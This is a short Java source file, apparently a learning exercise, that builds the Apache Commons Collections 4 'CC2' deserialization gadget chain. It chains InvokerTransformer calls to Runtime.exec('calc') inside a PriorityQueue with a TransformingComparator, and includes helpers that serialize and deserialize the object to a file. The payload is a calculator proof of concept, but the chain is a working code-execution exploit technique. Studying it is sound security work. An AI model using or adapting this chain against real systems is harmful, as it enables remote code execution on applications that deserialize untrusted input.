package com.mechoy;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * Author  Mechoy
 * Version 1.0
 * Date    2023/3/30
 */
public class CC2Test2 {
    public static String path = "ser.bin";

    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Transformer<Object,Object>[] transformer = new Transformer[]{
                new ConstantTransformer<Object,Object>(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        ChainedTransformer<Object> chainedTransformer = new ChainedTransformer<>(transformer);

        TransformingComparator<Object, Object> transformingComparator = new TransformingComparator<>(chainedTransformer);

        PriorityQueue<Object> objects = new PriorityQueue<>(transformingComparator);

        Class<? extends PriorityQueue> c = objects.getClass();
        Field size = c.getDeclaredField("size");
        size.setAccessible(true);
        size.set(objects,2);

//        serialize(objects);
        deserialize();
    }

    public static void serialize(Object obj) throws IOException {
        FileOutputStream fos = new FileOutputStream(path);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
    }

    public static Object deserialize() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(path);
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object o = ois.readObject();
        return o;
    }
}
